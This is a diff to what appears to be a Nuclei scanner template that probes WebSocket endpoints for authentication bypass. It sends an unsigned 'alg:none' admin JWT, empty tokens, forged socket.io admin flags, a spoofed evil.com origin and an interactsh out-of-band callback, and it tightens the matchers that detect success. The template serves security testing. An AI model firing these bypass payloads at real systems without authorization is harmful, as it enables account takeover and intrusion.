@@ -22,8 +22,9 @@ info:
 variables:
   bypass_id: '{{randstr}}'
   callback: '{{interactsh-url}}'
+  ws_base: '{{replace(replace(BaseURL, ''https://'', ''wss://''), ''http://'', ''ws://'')}}'
 websocket:
-- address: ws://{{Hostname}}/ws
+- address: '{{ws_base}}/ws'
   inputs:
   - data: '{"type":"connect","user":"admin"}'
   - data: '{"type":"auth","token":""}'
@@ -32,47 +33,57 @@ websocket:
   - data: '{"type":"auth","jwt":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."}'
   - data: '{"type":"validate","callback":"{{callback}}/ws-{{bypass_id}}"}'
   matchers:
-  - part: response
-    type: word
-    words:
-    - '"authenticated":true'
-    - '"role":"admin"'
-    - '"success":true'
+  - condition: or
+    part: response
+    regex:
+    - '"authenticated"\s*:\s*true'
+    - '"role"\s*:\s*"admin"'
     - Welcome admin
-  - part: interactsh_protocol
-    type: word
-    words:
-    - http
-    - dns
+    type: regex
+  - dsl:
+    - (interactsh_protocol == "http" || interactsh_protocol == "dns") && contains(interactsh_request,
+      "ws-{{bypass_id}}")
+    type: dsl
   matchers-condition: or
-- address: wss://{{Hostname}}/ws
+- address: '{{ws_base}}/ws'
+  headers:
+    Origin: https://evil.com
   inputs:
   - data: '{"type":"connect","origin":"evil.com"}'
   matchers:
-  - negative: false
+  - condition: and
     part: response
     type: word
     words:
     - connected
     - authenticated
-  origin: https://evil.com
-- address: ws://{{Hostname}}/socket.io/?transport=websocket
+- address: '{{ws_base}}/socket.io/?transport=websocket'
   inputs:
   - data: 42["authenticate",{"token":"bypass","admin":true}]
   - data: 42["join",{"room":"admin","bypass":true}]
   matchers:
-  - part: response
+  - condition: or
+    part: response
     regex:
     - 43\["authenticated"
-    - '"sid":"[a-zA-Z0-9]+"'
     type: regex
-- address: ws://{{Hostname}}/graphql-ws
+- address: '{{ws_base}}/graphql-ws'
   inputs:
   - data: '{"type":"connection_init","payload":{"authorization":""}}'
   - data: '{"type":"start","payload":{"query":"subscription { adminData }"}}'
   matchers:
-  - part: response
+  - condition: and
+    part: response
     type: word
     words:
     - connection_ack
     - '"data":'
+  - condition: or
+    negative: true
+    part: response
+    type: word
+    words:
+    - unauthorized
+    - forbidden
+    - invalid token
+  matchers-condition: and
